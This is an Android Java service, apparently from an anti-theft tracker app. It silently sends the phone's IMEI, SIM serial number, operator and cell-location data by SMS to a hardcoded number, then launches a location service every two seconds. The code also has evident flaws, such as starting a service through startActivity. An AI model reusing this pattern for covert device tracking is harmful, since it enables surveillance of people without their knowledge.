package com.mobile.tracker;

import java.util.Timer;
import java.util.TimerTask;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.widget.Toast;

public class SimChangedService extends IntentService {

	public SimChangedService(String name) {
		super(name);
		// TODO Auto-generated constructor stub

	}

	public SimChangedService() {
		super("test");
	}

	@Override
	protected void onHandleIntent(Intent intent) {
		// TODO Auto-generated method stub

		TelephonyManager telephonyMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		SmsManager smsMgr = SmsManager.getDefault();
		String imei, ssno, sopname, nopname, ncountryiso;
		GsmCellLocation location = (GsmCellLocation) telephonyMgr
				.getCellLocation();
		Timer mytimer = new Timer();

		// pno=telephonyMgr.getLine1Number();
		imei = telephonyMgr.getDeviceId();
		ssno = telephonyMgr.getSimSerialNumber();
		sopname = telephonyMgr.getSimOperatorName();
		nopname = telephonyMgr.getNetworkOperatorName();
		ncountryiso = telephonyMgr.getNetworkCountryIso();
		int cid = location.getCid();
		int lac = location.getLac();
		String cellid = Integer.toString(cid);
		String locareacode = Integer.toString(lac);
		String msg = "IMEI_NO : " + imei + "SIM_SERIAL_NO : " + ssno
				+ "SIM_OP_NAME : " + sopname + "NETWORK_OP_NAME : " + nopname
				+ "NETWORK_COUNTRY_ISO : " + ncountryiso
				+ "LOCATION_AREA_CODE : " + locareacode + "CELL_ID : " + cellid;

		smsMgr.sendTextMessage("+917755048138", null, msg, null, null);
		Toast.makeText(getApplicationContext(), "simchangedservice",
				Toast.LENGTH_LONG).show();

		// create webservice client to send current location to webservice
		// contineously

		mytimer.scheduleAtFixedRate(new TimerTask() {

			@Override
			public void run() {
				// TODO Auto-generated method stub
				Intent inten = new Intent(SimChangedService.this,
						MyLocationService.class);
				inten.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				getApplicationContext().startActivity(inten);

			}

		}, 0, 2000);

	}

}
